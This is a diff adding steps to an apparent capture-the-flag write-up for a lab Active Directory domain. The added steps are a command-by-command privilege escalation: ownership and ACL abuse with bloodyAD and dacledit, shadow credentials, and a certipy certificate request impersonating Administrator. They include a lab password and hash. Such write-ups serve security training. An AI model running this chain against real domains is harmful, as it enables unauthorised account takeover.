@@ -162,7 +162,33 @@ Get the user flag!
 
 BloodHound
 
-bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+BloodyAD
+
+    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
 
 ![image](https://github.com/user-attachments/assets/149fa255-e048-4fc5-89d1-a047916f1414)
+
+Dacledit
+
+    dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+
+![image](https://github.com/user-attachments/assets/fe9ee738-8ebd-4bb8-9095-c888448e814e)
+
+Certipy-AD
+
+    certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc
+
+![image](https://github.com/user-attachments/assets/4f3b6c1b-1b5a-4b76-bba1-244794e6fed0)
+
+    3b181b914e7a9d5508ea1e20bc2b7fce
+
+Kerberos
+
+    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout 
+
+![image](https://github.com/user-attachments/assets/cb837f4d-23a7-4f7a-87bd-0ed71d11ec1c)
+
+Request to cert
+
+    certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51
 
